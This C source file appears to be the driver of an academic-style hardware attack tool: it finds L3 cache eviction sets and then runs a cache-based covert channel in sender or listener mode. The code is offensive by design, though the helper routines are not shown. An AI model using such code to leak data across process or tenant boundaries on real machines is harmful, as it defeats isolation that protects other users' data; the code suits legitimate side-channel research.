#include "attack.h"
#include <signal.h>

#define KEY	(27317)

int MODE = 0;
char FILE_PATH[256] = {0};

size_t CACHE_SET_INDEX[N_CACHE_SET_INDICES_MAX] = {0};
s_set **EVICTION_SETS[N_CACHE_SET_INDICES_MAX] = {NULL};
size_t N_EVICTION_SETS[N_CACHE_SET_INDICES_MAX] = {0};

int initialize(void) {
	// < 0 :	Error
	// == 0 :	Success
	s_set **potentially_conflict_sets = NULL;
	size_t n_potentially_conflict_sets = 0;
	s_set *conflict_set = NULL;
	s_set *conflict_set_ = NULL;
	size_t i, j, k, cnt;

	printf("< Initialize eviction sets >\n");

	if(N_CACHE_SET_INDICES > N_CACHE_SET_INDICES_MAX)
		N_CACHE_SET_INDICES = N_CACHE_SET_INDICES_MAX;
	else if(N_CACHE_SET_INDICES < 1)
		N_CACHE_SET_INDICES = 1;
	if(BASE_CACHE_INDEX + N_CACHE_SET_INDICES > L3_CACHE_N_SETS)
		BASE_CACHE_INDEX = L3_CACHE_N_SETS - N_CACHE_SET_INDICES;
	for(i = 0; i < N_CACHE_SET_INDICES; i++)
		CACHE_SET_INDEX[i] = BASE_CACHE_INDEX + i;
	srand(time(NULL));

	init_memory_again:
	if(init_memory(rand() % (KEY + MODE)) < 0) {
		DEBUG_PRINT("\tinit_memory_info()\n");
		return -1;
	}

	if(!(potentially_conflict_sets = get_potentially_conflict_sets(&n_potentially_conflict_sets))) {
		DEBUG_PRINT("\tget_potentially_conflict_sets()\n");
		free_memory();
		goto init_memory_again;
	}

	for(i = 0; i < N_CACHE_SET_INDICES; i++) {
		cnt = 0;

		get_conflict_set_again:
		if((++cnt) > N_TRIES)
			continue;
		conflict_set = get_conflict_set(potentially_conflict_sets[CACHE_SET_INDEX[i]]);
		if(!conflict_set) {
			free_sets(potentially_conflict_sets, n_potentially_conflict_sets);
			free_memory();
			goto init_memory_again;
		}
		DEBUG_PRINT("\t(Found a conflict set for cache set #%lu)\n", i);

		EVICTION_SETS[i] = get_eviction_sets(potentially_conflict_sets[CACHE_SET_INDEX[i]], conflict_set, &N_EVICTION_SETS[i]);
		free_set(conflict_set);
		if(!EVICTION_SETS[i])
			goto get_conflict_set_again;
		DEBUG_PRINT("\t(Found eviction sets for cache set #%lu)\n", i);
		break;
	}
	if(i == N_CACHE_SET_INDICES) {
		free_sets(potentially_conflict_sets, n_potentially_conflict_sets);
		free_memory();
		goto init_memory_again;
	}
	cnt = i;
	for(i = 0; i < N_CACHE_SET_INDICES; i++) {
		if(i != cnt) {
			N_EVICTION_SETS[i] = N_EVICTION_SETS[cnt];
			EVICTION_SETS[i] = init_sets(N_EVICTION_SETS[i], L3_CACHE_ASSOC);
			for(j = 0; j < N_EVICTION_SETS[i]; j++) {
				EVICTION_SETS[i][j] = copy_set(EVICTION_SETS[cnt][j]);
				for(k = 0; k < EVICTION_SETS[i][j]->n_elements; k++)
					EVICTION_SETS[i][j]->elements[k] = (EVICTION_SETS[i][j]->elements[k] & (~0x1FFFF)) | (CACHE_SET_INDEX[i] << 6);
			}
		}
	}

	free_sets(potentially_conflict_sets, n_potentially_conflict_sets);

	return 0;
}

int attack(void) {
	// < 0 :	Error
	// == 0 :	Success
	uint64_t *START_ADDR[N_CACHE_SET_INDICES_MAX][L3_CACHE_N_SLICES];
	// size_t SLICE_INDEX[N_CACHE_SET_INDICES_MAX];
	size_t i, j;

	printf("< Start a covert channel >\n");
	getchar();

	switch(MODE) {
		case 0:
		case 1:
			for(i = 0; i < N_CACHE_SET_INDICES; i++) {
				for(j = 0; j < N_EVICTION_SETS[i]; j++) {
					create_direction(EVICTION_SETS[i][j]);
					START_ADDR[i][j] = (uint64_t *)(EVICTION_SETS[i][j]->elements[0]);
				}
			}
			listen(START_ADDR, FILE_PATH, MODE);
			break;
		case 2:
			send(EVICTION_SETS, N_EVICTION_SETS);
			break;
		default:
			return -1;
	}

	return 0;
}

void finalize(void) {
	size_t i;

	printf("< Finalize >\n");
	for(i = 0; i < N_CACHE_SET_INDICES; i++)
		free_sets(EVICTION_SETS[i], N_EVICTION_SETS[i]);
	free_memory();
}

void sig_handler(int sig) {
	finalize();

	exit(0);
}

int main(const int argc, char **argv) {
	int opt;

	signal(SIGINT, sig_handler);

	while((opt = getopt(argc, argv, "b:c:f:so")) != -1) {
		switch(opt){
		case 'b':
			BASE_CACHE_INDEX = atoi(optarg);
			break;
		case 'c':
			N_CACHE_SET_INDICES = atoi(optarg);
			break;
		case 'f':
			strncpy(FILE_PATH, optarg, sizeof(FILE_PATH));
			break;
		case 's':
			MODE = 1;
			break;
		case 'o':
			MODE = 2;
			break;
		}
	}

	// Find eviction sets
	if(initialize() < 0) {
		DEBUG_PRINT("initialize()\n");
		return -1;
	}

	// Take an attack
	if(attack() < 0) {
		DEBUG_PRINT("\tcovert_channel()");
		finalize();
		return -1;
	}

	// Finalize
	finalize();

	return 0;
}